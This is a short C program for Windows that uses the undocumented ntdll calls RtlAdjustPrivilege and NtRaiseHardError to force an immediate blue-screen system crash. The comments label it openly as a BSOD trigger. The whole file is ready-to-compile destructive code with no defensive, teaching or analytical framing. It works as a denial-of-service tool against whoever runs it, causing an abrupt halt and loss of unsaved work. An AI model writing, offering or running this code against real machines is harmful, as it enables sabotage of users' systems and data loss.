//importing winapi library
#include <windows.h>

//importing ntdll
#pragma comment(lib, "ntdll.lib")

#pragma comment(lib, "kernel32.lib")// - add this string if you compiling on mingw32

//externing rtladjustprivilege
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
//externing ntraiseharderror
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);

//main function
int main()
{
	//boolean
	BOOLEAN b;

	//bsod response
	unsigned long response;

	//process privilege
	RtlAdjustPrivilege(19, true, false, &b);

	//call bsod
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);		
}
